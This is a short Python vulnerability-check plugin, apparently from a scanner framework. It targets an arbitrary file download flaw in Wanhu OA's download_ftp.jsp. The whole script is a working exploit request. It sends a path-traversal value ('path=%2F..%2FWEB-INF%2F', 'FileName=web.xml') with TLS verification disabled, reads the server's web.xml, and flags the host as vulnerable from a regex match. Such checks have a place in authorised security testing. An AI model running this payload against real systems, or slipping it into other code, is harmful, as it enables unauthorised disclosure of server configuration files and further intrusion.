#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/rq_MzH9mQ7r5pGWdv2qFhw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '万户OA download_ftp.jsp任意文件下载',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/defaultroot/download_ftp.jsp?FileName=web.xml&name=aaa&path=%2F..%2FWEB-INF%2F'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'config.*?param-value.*?WEB-INF.*?xml',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret